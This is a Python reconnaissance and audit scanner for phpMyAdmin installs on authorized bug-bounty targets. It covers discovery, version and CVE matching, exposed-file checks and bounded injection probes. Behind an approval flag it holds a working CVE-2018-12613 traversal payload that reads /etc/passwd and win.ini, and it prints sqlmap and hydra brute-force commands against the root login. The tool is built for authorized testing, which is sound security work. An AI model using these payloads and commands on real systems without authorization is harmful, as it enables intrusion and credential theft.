#!/usr/bin/env python3
"""phpMyAdmin recon and audit probe for authorized targets (Kali-friendly).

Default run is passive and bounded. It sends GET, HEAD, OPTIONS and TRACE requests,
one marker or single-quote request per parameter, and one nonexistent-file traversal.
It never submits credentials, never brute-forces, never writes files or rows, and
never runs exploit code. CVE rows are matched by version string only.

Riskier steps need explicit switches:
  --lfi-approved   read /etc/passwd and win.ini through the target parameter
  --nmap           service detection on the in-scope host (ports, MySQL banner)
  --searchsploit   offline exploit-db lookup for the detected version (titles only)
  --no-injection-probes  skip the marker, quote and traversal probes

The scope gate (scripts/scope_check.sh) runs first. Every request counts against
--max-requests, and each request waits --delay seconds after the previous one.

--print-kali prints the Kali command set for the target and sends nothing.

Examples:
  pma_probe.py --target https://app.example.com --workspace ~/Documents/bugbounty --program example
  pma_probe.py --target https://app.example.com/pma --nmap --searchsploit
  pma_probe.py --target https://app.example.com --lfi-approved    # only with written approval
  pma_probe.py --target app.example.com --print-kali
"""
from __future__ import annotations

import argparse
import datetime as dt
import json
import math
import os
import re
import secrets
import shutil
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import Counter
from html.parser import HTMLParser

REPO = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "..", ".."))
SCOPE = os.path.join(REPO, "scripts", "scope_check.sh")
WORDLIST = os.path.join(REPO, "wordlists", "phpmyadmin.txt")
UA = "Mozilla/5.0 (X11; Linux x86_64) pma-audit-probe/1.0"
MAX_BODY = 262144

INSTALL_PATHS = [
    "/phpmyadmin", "/pma", "/PMA", "/myadmin", "/admin/phpmyadmin", "/db/phpmyadmin",
    "/mysql/phpmyadmin", "/tools/phpmyadmin", "/phpmyadmin_old", "/phpmyadmin_backup",
    "/phpmyadmin-old", "/phpMyAdmin", "/admin/pma", "/sql/phpmyadmin", "/database/phpmyadmin",
    "/dbadmin",
]
STRONG_MARKERS = re.compile(r"pma_username|pma_password|pma_servername|pmahomme", re.I)
WEAK_MARKER = re.compile(r"phpmyadmin", re.I)
VERSION_RES = [
    (re.compile(r"<!--\s*phpMyAdmin\s+v?(\d+(?:\.\d+)+[\w.-]*)\s*-->", re.I), "html-comment"),
    (re.compile(r"phpMyAdmin[\s/_-]+v?(\d+\.\d+(?:\.\d+)+[\w.-]*)"), "product-string"),
    (re.compile(r"pma_version[\"'\s:=]+[\"']?(\d+(?:\.\d+)+)", re.I), "pma-version"),
    (re.compile(r"(?:phpmyadmin|pma)[\w.-]*\.(?:css|js)\?v=(\d+(?:\.\d+)+)", re.I), "asset-query"),
]
# CVE rows are version checks only. Ranges are [lo, hi) from the supplied checklist.
# Confirm each match against the vendor advisory before reporting.
CVE_TABLE = [
    ("PMA-086", "CVE-2025-24530", "Check Tables XSS", "medium", [((5, 0, 0), (5, 2, 2))]),
    ("PMA-087", "CVE-2025-24529", "Database/table name XSS", "medium", [((5, 0, 0), (5, 2, 2))]),
    ("PMA-059", "CVE-2020-26935", "SQL injection in search", "medium", [((4, 9, 0), (4, 9, 6)), ((5, 0, 0), (5, 0, 3))]),
    ("PMA-059", "CVE-2020-10802", "SQL injection in search", "medium", [((4, 9, 0), (4, 9, 5)), ((5, 0, 0), (5, 0, 2))]),
    ("PMA-069", "CVE-2018-12613", "LFI via target parameter", "high", [((4, 8, 0), (4, 8, 2))]),
    ("PMA-052", "CVE-2015-6830", "reCAPTCHA bypass", "low", [((4, 3, 0), (4, 3, 13, 2)), ((4, 4, 0), (4, 4, 14, 1))]),
    ("PMA-079", "CVE-2005-3299", "Directory traversal (2.6.4 series)", "verify", [((2, 6, 4), (2, 6, 5))]),
]
XSS_PARAMS = ["db", "table", "server", "lang", "target"]
ERROR_PARAMS = ["db", "table", "server", "pos", "sql_query"]
SQL_ERR_RE = re.compile(r"You have an error in your SQL syntax|mysqli_sql_exception|SQLSTATE\[|"
                        r"Unknown database|Unknown column|Access denied for user", re.I)
PHP_ERR_RE = re.compile(r"Fatal error:|Warning:|Notice:|on line \d+", re.I)
TRAV_ERR_RE = re.compile(r"No such file|failed to open stream|Failed opening|open_basedir|"
                         r"Warning: (include|require)", re.I)
LFI_PREFIXES = ["db_sql.php%253f/" + "../" * 6, "db_sql.php%3f/" + "../" * 6]
LFI_READS = [("etc/passwd", re.compile(r"root:x:0:0")), ("windows/win.ini", re.compile(r"\[fonts\]|\[extensions\]", re.I))]
SECRET_RE = re.compile(r"(?i)(blowfish_secret|password|passwd|secret|token|api[_-]?key)(['\"]?\s*[:=]\s*['\"]?)([^'\"\s;<]{3,})")

# (check, relative path, kind, signatures, label, where, severity)
# where: "install" = relative to the phpMyAdmin install path, "root" = relative to the site root.
EXPOSURES = [
    ("PMA-027", "config.inc.php", "text", [r"<\?php", r"\$cfg\["], "config.inc.php served as source", "install", "high"),
    ("PMA-028", "config.sample.inc.php", "text", [r"\$cfg\["], "sample config served", "install", "medium"),
    ("PMA-029", "libraries/config.default.php", "text", [r"\$cfg\["], "default config served", "install", "medium"),
    ("PMA-030", "setup/frames/config.inc.php", "text", [r"<\?php", r"\$cfg\["], "setup config served", "install", "high"),
    ("PMA-031", ".htaccess", "text", [r"RewriteEngine|AuthType|Require\s|Order\s+(allow|deny)|Options\s"], ".htaccess readable", "install", "low"),
    ("PMA-033", ".htpasswd", "text", [r"(?m)^[^:\s]+:\$?[\w$./]{13,}"], ".htpasswd readable", "install", "high"),
    ("PMA-036", ".git/HEAD", "text", [r"ref:\s*refs/"], ".git exposed", "root", "high"),
    ("PMA-036", ".git/config", "text", [r"\[core\]"], ".git config exposed", "root", "high"),
    ("PMA-037", ".svn/wc.db", "text", [r"SQLite format 3"], ".svn database exposed", "root", "high"),
    ("PMA-037", ".svn/entries", "text", [r"(?m)^dir\s*$"], ".svn entries exposed", "root", "high"),
    ("PMA-038", ".hg/requires", "text", [r"revlogv1|store|fncache|dotencode"], ".hg exposed", "root", "high"),
    ("PMA-039", "phpmyadmin.tar.gz", "magic", [], "archive served", "root", "medium"),
    ("PMA-039", "phpmyadmin.zip", "magic", [], "archive served", "root", "medium"),
    ("PMA-039", "phpmyadmin.tar", "magic", [], "archive served", "root", "medium"),
    ("PMA-040", "dump.sql", "text", [r"CREATE TABLE|INSERT INTO|-- MySQL dump"], "SQL dump in web root", "root", "high"),
    ("PMA-040", "db.sql", "text", [r"CREATE TABLE|INSERT INTO|-- MySQL dump"], "SQL dump in web root", "root", "high"),
    ("PMA-040", "backup.sql", "text", [r"CREATE TABLE|INSERT INTO|-- MySQL dump"], "SQL dump in web root", "root", "high"),
    ("PMA-040", "phpmyadmin.sql", "text", [r"CREATE TABLE|INSERT INTO|-- MySQL dump"], "SQL dump in web root", "root", "high"),
]
BACKUP_SUFFIXES = ["config.inc.php.bak", "config.inc.php~", "config.inc.php.old", "config.inc.php.sample",
                   ".config.inc.php", "config.inc.php.save", "config.inc.php.orig"]
for _s in BACKUP_SUFFIXES:
    EXPOSURES.append(("PMA-032", _s, "text", [r"<\?php|\$cfg\["], "config backup served", "install", "high"))
DIR_CHECKS = ["libraries/", "js/", "themes/", "locale/", "sql/", "examples/"]
PHPINFO = [("install", "phpinfo.php"), ("install", "info.php"), ("root", "phpinfo.php"), ("root", "info.php")]
SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "verify": 4, "info": 5}


class BudgetExceeded(Exception):
    pass


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None  # report the redirect instead of following it


class Client:
    def __init__(self, delay: float, budget: int, insecure: bool, timeout: float):
        ctx = ssl._create_unverified_context() if insecure else ssl.create_default_context()
        self.opener = urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=ctx))
        self.delay, self.budget, self.timeout = delay, budget, timeout
        self.count = 0
        self.last = 0.0

    def get(self, url: str, method: str = "GET", cookie: str | None = None) -> dict:
        if self.count >= self.budget:
            raise BudgetExceeded(f"request budget {self.budget} reached")
        wait = self.delay - (time.monotonic() - self.last)
        if wait > 0:
            time.sleep(wait)
        self.count += 1
        headers = {"User-Agent": UA, "Accept": "*/*"}
        if cookie:
            headers["Cookie"] = cookie
        req = urllib.request.Request(url, method=method, headers=headers)
        self.last = time.monotonic()
        try:
            with self.opener.open(req, timeout=self.timeout) as resp:
                status, hdrs = resp.status, resp.headers
                raw = resp.read(MAX_BODY) if method != "HEAD" else b""
        except urllib.error.HTTPError as e:
            status, hdrs = e.code, e.headers
            try:
                raw = e.read(MAX_BODY) if method != "HEAD" else b""
            except OSError:
                raw = b""
        except (urllib.error.URLError, OSError, ValueError) as e:
            return {"url": url, "method": method, "status": None, "error": str(e)[:200], "text": "", "raw": b""}
        return {
            "url": url, "method": method, "status": status,
            "headers": {k.lower(): v for k, v in hdrs.items()},
            "set_cookie": hdrs.get_all("Set-Cookie") or [],
            "location": hdrs.get("Location"),
            "raw": raw, "text": raw.decode("utf-8", "replace"),
        }


def redact(s: str) -> str:
    return SECRET_RE.sub(lambda m: m.group(1) + m.group(2) + "<redacted>", s)


def around(text: str, m: re.Match, n: int = 120) -> str:
    s, e = max(0, m.start() - n // 2), min(len(text), m.end() + n // 2)
    return redact(re.sub(r"\s+", " ", text[s:e]).strip())[:n]


def parse_target(raw: str) -> tuple[str, str, str]:
    if "://" not in raw:
        raw = "https://" + raw
    u = urllib.parse.urlsplit(raw)
    base = f"{u.scheme}://{u.netloc}"
    return u.hostname or "", base, u.path.rstrip("/")


def pad(t: tuple[int, ...]) -> tuple[int, ...]:
    return tuple(t) + (0,) * (4 - len(t))


def parse_version(s: str) -> tuple[int, ...]:
    return pad(tuple(int(x) for x in re.findall(r"\d+", s)))


def cookie_flags(sc: str) -> dict:
    parts = [p.strip() for p in sc.split(";")]
    name = parts[0].split("=", 1)[0]
    attrs = [p.lower() for p in parts[1:]]
    same = next((p.split("=", 1)[1] for p in attrs if p.startswith("samesite=")), None)
    return {"name": name, "httponly": "httponly" in attrs, "secure": "secure" in attrs,
            "samesite": same, "path": next((p.split("=", 1)[1] for p in parts[1:] if p.lower().startswith("path=")), None)}


class _Forms(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms: list[dict] = []
        self._cur: dict | None = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._cur = {"action": a.get("action") or "", "method": (a.get("method") or "GET").upper(), "inputs": []}
            self.forms.append(self._cur)
        elif tag in ("input", "select", "textarea") and self._cur is not None:
            typ = (a.get("type") or tag).lower()
            self._cur["inputs"].append({"tag": tag, "name": a.get("name") or "", "type": typ})

    def handle_endtag(self, tag):
        if tag == "form":
            self._cur = None


def token_stats(v: str) -> dict:
    n = len(v)
    counts = Counter(v)
    h = -sum((c / n) * math.log2(c / n) for c in counts.values()) if n else 0.0
    if re.fullmatch(r"[0-9a-fA-F]+", v):
        charset = "hex"
    elif re.fullmatch(r"[A-Za-z0-9+/=_-]+", v):
        charset = "base64-or-alnum"
    else:
        charset = "other"
    return {"length": n, "charset": charset, "entropy_bits_est": round(h * n, 1)}


def login_token(text: str) -> str | None:
    m = re.search(r"""<input[^>]*name=["']token["'][^>]*>""", text, re.I)
    if not m:
        return None
    v = re.search(r"""value=["']([^"']*)["']""", m.group(0), re.I)
    return v.group(1) if v else ""


def run_checks(c: Client, host: str, base: str, path_hint: str, args, report: dict, findings: list) -> None:
    def add(check, severity, title, url, evidence="", **extra):
        findings.append({"check": check, "severity": severity, "title": title, "url": url,
                         "evidence": evidence, **extra})

    # 1. Discovery (PMA-002, PMA-003, PMA-011, PMA-012)
    candidates = ([path_hint] if path_hint else []) + ([args.install_path] if args.install_path else []) + INSTALL_PATHS
    installs = []
    seen = set()
    for p in candidates:
        p = "/" + p.strip("/")
        if p in seen or p == "/":
            continue
        seen.add(p)
        url = base + p + "/"
        r = c.get(url)
        st = r.get("status")
        if st is None:
            continue
        if st == 200 and not (STRONG_MARKERS.search(r["text"]) or len(WEAK_MARKER.findall(r["text"])) >= 2):
            r2 = c.get(url + "index.php")  # some installs answer only on index.php
            if r2.get("status") == 200:
                r = r2
                url = url + "index.php"
                st = r2["status"]
        text, loc = r["text"], r.get("location") or ""
        strong = bool(STRONG_MARKERS.search(text))
        weak = len(WEAK_MARKER.findall(text))
        kind = None
        if st == 200 and (strong or weak >= 2):
            kind = "app"
        elif st in (301, 302, 303, 307, 308) and re.search(r"phpmyadmin|pma|index\.php", loc, re.I):
            kind = "redirect"
        elif st in (401, 403) and re.search(r"pma|phpmyadmin", p, re.I):
            kind = "restricted"
        if not kind:
            continue
        title_m = re.search(r"<title[^>]*>(.*?)</title>", text, re.I | re.S)
        inst = {"path": p + "/", "url": base + p + "/", "entry": url, "status": st, "kind": kind,
                "server": r["headers"].get("server"), "x_powered_by": r["headers"].get("x-powered-by"),
                "title": (title_m.group(1).strip() if title_m else None), "location": loc or None}
        installs.append(inst)
        if kind == "redirect":
            add("PMA-011", "info", "install path redirects", url, f"Location: {loc}")
        if kind == "restricted":
            add("PMA-012", "info", "restricted install path present", url, f"status {st}")
    report["installs"] = installs
    primary = next((i for i in installs if i["kind"] == "app"), None) or (installs[0] if installs else None)
    if not primary:
        report["note"] = "no phpMyAdmin install found on the candidate paths; pass --install-path"
        return
    report["primary_install"] = primary
    install = primary["url"]          # directory URL, ends with /
    index = primary["entry"]          # login entry point (index.php or the directory)

    # 2. Fingerprint (PMA-009, PMA-013 to PMA-020, PMA-023, PMA-103, PMA-104)
    r = c.get(index)
    text, hdrs = r["text"], r["headers"]
    report["headers"] = {k: hdrs.get(k) for k in ("server", "x-powered-by", "x-frame-options", "content-security-policy", "strict-transport-security")}
    version, vsource = None, None
    for rx, src in VERSION_RES:
        m = rx.search(text)
        if m:
            version, vsource = m.group(1), src
            break
    report["version"] = {"detected": version, "source": vsource}

    forms = _Forms()
    forms.feed(text)
    report["forms"] = forms.forms
    login_names = {i["name"] for f in forms.forms for i in f["inputs"]}
    missing = [n for n in ("pma_username", "pma_password", "server", "token") if n not in login_names]
    report["login_fields"] = {"present": sorted(login_names & {"pma_username", "pma_password", "server", "token", "go"}),
                              "missing": missing}
    report["language_selector"] = bool(re.search(r'name=["\']lang["\']', text, re.I))
    if "token" in login_names:
        tok = login_token(text)
        report["token"] = {"present": True, **(token_stats(tok) if tok else {"length": 0})}
        if tok is not None and token_stats(tok)["entropy_bits_est"] < 64:
            add("PMA-098", "medium", "low-entropy anti-CSRF token", index,
                f"estimated {token_stats(tok)['entropy_bits_est']} bits")
    else:
        report["token"] = {"present": False}
        add("PMA-097", "info", "no hidden token on the login form", index, "token field not found")

    cookies = [cookie_flags(sc) for sc in r["set_cookie"]]
    report["cookies"] = cookies
    for ck in cookies:
        if not re.match(r"(?i)^(phpmyadmin|pma)", ck["name"]):
            continue
        gaps = []
        if not ck["httponly"]:
            gaps.append("HttpOnly")
        if base.startswith("https") and not ck["secure"]:
            gaps.append("Secure")
        if not ck["samesite"]:
            gaps.append("SameSite")
        if gaps:
            add("PMA-103", "low" if ("HttpOnly" in gaps or "Secure" in gaps) else "info",
                f"cookie {ck['name']} missing {', '.join(gaps)}", index, f"path={ck['path']}")
        add("PMA-104", "info", f"cookie {ck['name']} scope", index, f"path={ck['path']}")

    if version:
        cve_hits = []
        v = parse_version(version)
        for check, cve, title, sev, ranges in CVE_TABLE:
            if any(pad(lo) <= v < pad(hi) for lo, hi in ranges):
                cve_hits.append(cve)
                add(check, sev, f"{cve} version match ({title})", index,
                    f"detected {version}; confirm against vendor advisory before reporting")
        report["version"]["cve_matches"] = cve_hits
    else:
        report["version"]["cve_matches"] = []
        add("PMA-124", "info", "version not disclosed", index, "no version string on the login page")

    for m_name in ("OPTIONS", "HEAD", "TRACE"):
        rr = c.get(index, method=m_name)
        report.setdefault("methods", {})[m_name] = {"status": rr.get("status"), "allow": rr["headers"].get("allow")}
        if m_name == "TRACE" and rr.get("status") == 200 and "TRACE" in rr["text"].upper():
            add("PMA-023", "low", "TRACE enabled (echoes request)", index, f"status {rr.get('status')}")

    # 3. Token analysis (PMA-047): fresh sessions with no cookie should get different tokens
    if "token" in report.get("login_fields", {}).get("present", []):
        fresh = []
        for _ in range(2):
            t = login_token(c.get(index)["text"])
            if t:
                fresh.append(t)
        if len(fresh) == 2 and fresh[0] == fresh[1] and report["token"].get("length"):
            add("PMA-047", "medium", "anti-CSRF token identical across fresh sessions", index,
                f"length {report['token']['length']}")
        report["token"]["fresh_session_samples"] = len(fresh)
        report["token"]["static_across_sessions"] = bool(len(fresh) == 2 and fresh[0] == fresh[1])

    # 4. Exposure checks (PMA-025, PMA-026, PMA-032 to PMA-034, PMA-036 to PMA-040)
    exposures = []

    def check_url(rel: str, where: str) -> str:
        return (install if where == "install" else base + "/") + rel

    for check, rel, kind, sigs, label, where, sev in EXPOSURES:
        url = check_url(rel, where)
        rr = c.get(url)
        if rr.get("status") != 200 or not rr.get("raw"):
            continue
        hit, evidence, pat = False, "", None
        if kind == "magic":
            raw = rr["raw"]
            hit = raw.startswith(b"\x1f\x8b") or raw.startswith(b"PK\x03\x04") or raw[257:262] == b"ustar"
            evidence = f"magic {raw[:4].hex()} size {len(raw)}"
            pat = "magic-bytes"
        else:
            for s in sigs:
                m = re.search(s, rr["text"], re.I)
                if m:
                    hit, pat, evidence = True, s, around(rr["text"], m)
                    break
        exposures.append({"check": check, "url": url, "status": 200, "size": len(rr["raw"]),
                          "flagged": hit, "signature": pat})
        if hit:
            add(check, sev, label, url, evidence)

    for d in DIR_CHECKS:
        url = install + d
        rr = c.get(url)
        if rr.get("status") == 200:
            m = re.search(r"Index of /|<title>Index of|Parent Directory", rr["text"], re.I)
            if m:
                add("PMA-025", "medium", f"directory listing enabled: {d}", url, around(rr["text"], m))
                exposures.append({"check": "PMA-025", "url": url, "status": 200, "flagged": True})
    setup = c.get(install + "setup/")
    if setup.get("status") == 200:
        add("PMA-026", "medium", "phpMyAdmin setup reachable without authentication", install + "setup/",
            f"status 200, size {len(setup['raw'])}")
        exposures.append({"check": "PMA-026", "url": install + "setup/", "status": 200, "flagged": True})
    for where, rel in PHPINFO:
        url = check_url(rel, where)
        rr = c.get(url)
        if rr.get("status") == 200:
            m = re.search(r"phpinfo\(\)|PHP Version\s|PHP Credits", rr["text"])
            if m:
                add("PMA-034", "medium", "phpinfo page exposed", url, around(rr["text"], m))
                exposures.append({"check": "PMA-034", "url": url, "status": 200, "flagged": True})
    report["exposures"] = exposures

    # 5. Injection probes, bounded (PMA-060, PMA-063, PMA-070, PMA-088, PMA-091, PMA-092)
    if not args.no_injection_probes:
        xss_rows = []
        for param in XSS_PARAMS:
            marker = "pmaq" + secrets.token_hex(4)
            payload = marker + "\"'<>"
            url = f"{index}?{param}={urllib.parse.quote(payload, safe='')}"
            rr = c.get(url)
            body = rr["text"]
            if payload in body:
                xss_rows.append({"param": param, "result": "reflected-unencoded"})
                add("PMA-088", "medium", f"input reflected unencoded in '{param}' (candidate; confirm in a browser)",
                    url, f"marker {marker} echoed with \"'<> intact")
            elif marker in body:
                xss_rows.append({"param": param, "result": "reflected-encoded"})
            else:
                xss_rows.append({"param": param, "result": "not-reflected"})
        report["xss_probe"] = xss_rows

        sql_rows = []
        for param in ERROR_PARAMS:
            url = f"{index}?{param}=%27"
            rr = c.get(url)
            m = SQL_ERR_RE.search(rr["text"])
            if m:
                add("PMA-060", "medium", f"SQL error text on single quote in '{param}'", url, around(rr["text"], m))
                sql_rows.append({"param": param, "result": "sql-error"})
            else:
                m2 = PHP_ERR_RE.search(rr["text"])
                if m2:
                    add("PMA-041", "low", f"PHP error output on '{param}'", url, around(rr["text"], m2))
                    sql_rows.append({"param": param, "result": "php-error"})
                else:
                    sql_rows.append({"param": param, "result": "no-error"})
        report["sql_error_probe"] = sql_rows

        nx = "pma_nx_" + secrets.token_hex(4)
        url = f"{index}?target={LFI_PREFIXES[0]}{nx}"
        rr = c.get(url)
        m = TRAV_ERR_RE.search(rr["text"])
        report["traversal_probe"] = {"result": "path-error-disclosed" if m else "no-disclosure"}
        if m:
            add("PMA-070", "medium", "traversal error discloses filesystem path or restriction", url,
                around(rr["text"], m))

    # 6. Approved file read (PMA-071, PMA-072): only with --lfi-approved
    if args.lfi_approved:
        lfi = []
        for rel, sig in LFI_READS:
            for prefix in LFI_PREFIXES:
                url = f"{index}?target={prefix}{rel}"
                rr = c.get(url)
                if sig.search(rr["text"]):
                    chk = "PMA-071" if "passwd" in rel else "PMA-072"
                    add(chk, "high", f"local file read via target parameter: {rel}", url,
                        "signature matched; file content not stored")
                    lfi.append({"file": rel, "result": "readable"})
                    break
            else:
                lfi.append({"file": rel, "result": "not-readable"})
        report["lfi_approved"] = lfi
    else:
        report["lfi_approved"] = "not-run (needs --lfi-approved)"

    # 7. Network (PMA-007, PMA-008, PMA-131)
    if args.nmap:
        host_only = host
        if shutil.which("nmap"):
            cmd = ["nmap", "-Pn", "-sT", "-sV", "--version-light", "--open",
                   "-p", "80,443,8080,8888,8008,3306", "-oG", "-", host_only]
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=300).stdout
            ports = []
            for port, svc, ver in re.findall(r"(\d+)/open/tcp//([^/]*)//([^/,]*)", out):
                ports.append({"port": int(port), "service": svc, "version": ver.strip() or None})
                if port == "3306":
                    add("PMA-008", "medium", "MySQL port 3306 reachable from this network", host_only,
                        f"banner: {ver.strip() or 'no version'}")
                if ver.strip() and port == "3306":
                    add("PMA-131", "info", "MySQL/MariaDB version from banner", host_only, ver.strip())
            report["ports"] = ports
        else:
            report["ports"] = "nmap not installed"

    # 8. Offline exploit-db lookup (PMA-127): titles only, never run
    if args.searchsploit and version:
        if shutil.which("searchsploit"):
            out = subprocess.run(["searchsploit", "--json", "phpmyadmin", version],
                                 capture_output=True, text=True, timeout=120).stdout
            try:
                results = json.loads(out).get("RESULTS_EXPLOIT", [])
            except (json.JSONDecodeError, AttributeError):
                results = []
            titles = [x.get("Title", "") for x in results][:25]
            report["searchsploit"] = {"count": len(results), "titles": titles, "executed": False}
            if results:
                add("PMA-127", "info", f"{len(results)} exploit-db entries mention phpMyAdmin {version}",
                    base, "titles recorded in report; no exploit was run")
        else:
            report["searchsploit"] = "searchsploit not installed"


def print_kali(target: str) -> None:
    host, base, _ = parse_target(target)
    rows = [
        ("Fingerprint", "whatweb -a 3 BASE"),
        ("WAF", "wafw00f BASE"),
        ("Headers", "curl -sI BASE/phpmyadmin/"),
        ("TLS", "openssl s_client -connect HOST:443 -servername HOST </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -dates"),
        ("Ports (PMA-007/008)", "nmap -Pn -sT -sV --open -p 80,443,8080,8888,8008,3306 HOST"),
        ("NSE checks (PMA-082)", "nmap -Pn -p 80,443 --script http-phpmyadmin-dir-traversal,http-phpself-xss HOST"),
        ("Path fuzz (PMA-004, PMA-042)", f"ffuf -u BASE/FUZZ/ -w {WORDLIST} -mc 200,301,302,401,403 -rate 10"),
        ("Path fuzz, dirs (PMA-042)", f"gobuster dir -u BASE -w {WORDLIST} -t 5 --delay 300ms -b 404"),
        ("Sensitive files (PMA-027 to PMA-040)", "dirsearch -u BASE -e php,bak,old,sql,zip,tar.gz -t 5 --delay 0.3 -i 200,301,302,403"),
        ("Detection templates only (PMA-001 to PMA-009)", "nuclei -u BASE -tags phpmyadmin,exposure,misconfig -severity info,low,medium -rl 5"),
        ("Web baseline", "nikto -h BASE"),
        ("Offline version lookup (PMA-127)", "searchsploit --json phpmyadmin VERSION   # read titles only; never run exploit code"),
        ("SQLi (authorized-only, PMA-064)", "sqlmap -u 'BASE/phpmyadmin/index.php?server=1' --batch --level 1 --risk 1 --technique=E   # approval and own instance only"),
        ("Hydra (authorized-only, PMA-051)", "hydra -l root -P APPROVED_LIST -t 1 -w 5 HOST https-post-form '/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&token=FIXED&server=1&go=Log+in:F=FAILURE_TEXT'   # static token only; approval required"),
    ]
    print(f"# Kali command set for {base} (printed only; nothing was sent)")
    for label, cmd in rows:
        print(f"\n## {label}\n{cmd.replace('BASE', base).replace('HOST', host)}")


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True, help="host or URL, for example https://app.example.com")
    ap.add_argument("--workspace", help="workspace root holding <program or target>/scope.txt")
    ap.add_argument("--program", help="program name; the scope file is <workspace>/<program>/scope.txt")
    ap.add_argument("--install-path", help="extra install path to try first, for example /pma2")
    ap.add_argument("--out", help="JSON output path (default: artifacts/<host>/phpmyadmin.json)")
    ap.add_argument("--delay", type=float, default=0.5, help="seconds between requests (default 0.5)")
    ap.add_argument("--max-requests", type=int, default=200, help="request budget (default 200)")
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--insecure", action="store_true", help="skip TLS certificate verification")
    ap.add_argument("--no-injection-probes", action="store_true", help="skip the marker, quote and traversal probes")
    ap.add_argument("--lfi-approved", action="store_true", help="read /etc/passwd and win.ini via traversal (needs written approval)")
    ap.add_argument("--nmap", action="store_true", help="nmap service detection on the in-scope host")
    ap.add_argument("--searchsploit", action="store_true", help="offline exploit-db title lookup for the detected version")
    ap.add_argument("--print-kali", action="store_true", help="print the Kali command set and exit (sends nothing)")
    args = ap.parse_args()

    if args.print_kali:
        print_kali(args.target)
        return 0

    host, base, path_hint = parse_target(args.target)
    if not host:
        sys.stderr.write("could not parse a host from --target\n")
        return 2
    res = subprocess.run([SCOPE, host, args.workspace or "", args.program or ""], capture_output=True, text=True)
    if res.returncode != 0:
        sys.stderr.write(res.stderr or "scope check failed\n")
        return res.returncode
    print(res.stdout.strip())

    c = Client(args.delay, args.max_requests, args.insecure, args.timeout)
    report: dict = {"target": host, "base": base, "generated": dt.datetime.now(dt.timezone.utc).isoformat(timespec="seconds"),
                    "scope": "ok", "flags": {"lfi_approved": args.lfi_approved, "nmap": args.nmap,
                                             "searchsploit": args.searchsploit,
                                             "injection_probes": not args.no_injection_probes}}
    findings: list[dict] = []
    try:
        run_checks(c, host, base, path_hint, args, report, findings)
    except BudgetExceeded as e:
        report["stopped"] = str(e)
    report["requests"] = c.count
    findings.sort(key=lambda f: (SEVERITY_ORDER.get(f["severity"], 9), f["check"]))
    report["findings"] = findings

    out = args.out or os.path.join(REPO, "artifacts", host, "phpmyadmin.json")
    os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
    with open(out, "w", encoding="utf-8") as fh:
        json.dump(report, fh, indent=2, default=str)

    print(f"requests sent: {c.count}   findings: {len(findings)}   report: {out}")
    for f in findings:
        print(f"[{f['severity']:>7}] {f['check']} {f['title']} -> {f['url']}")
    if "note" in report:
        print("note:", report["note"])
    return 0


if __name__ == "__main__":
    sys.exit(main())
